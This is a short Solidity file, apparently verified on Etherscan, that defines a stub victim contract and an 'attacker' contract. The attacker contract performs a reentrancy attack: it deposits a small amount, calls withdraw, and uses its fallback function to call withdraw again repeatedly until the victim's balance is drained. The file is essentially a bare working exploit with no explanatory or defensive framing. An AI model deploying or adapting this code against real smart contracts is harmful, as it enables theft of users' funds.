/**
 *Submitted for verification at Etherscan.io on 2021-04-19
*/

pragma solidity 0.6.10;
// SPDX-License-Identifier: MIT
contract victim {
    function deposit() public payable {}
    function withdraw(uint amount) public {}
}

contract attacker{
         address public contractAddress;
        constructor(address _address) public{
            contractAddress = _address;
        }
        
        function attack () external payable {
            require(msg.value >= 0.001 ether);
            victim vc = victim(contractAddress);
           // vc.deposit.value(0.001 ether);
            vc.deposit{value:0.001 ether}();
            vc.withdraw(0.0011 ether);
        }
        
        fallback () external payable{
            victim vc = victim(contractAddress);
            if(address(contractAddress).balance >=0.001 ether){
                vc.withdraw(0.001 ether);
            }
        }
}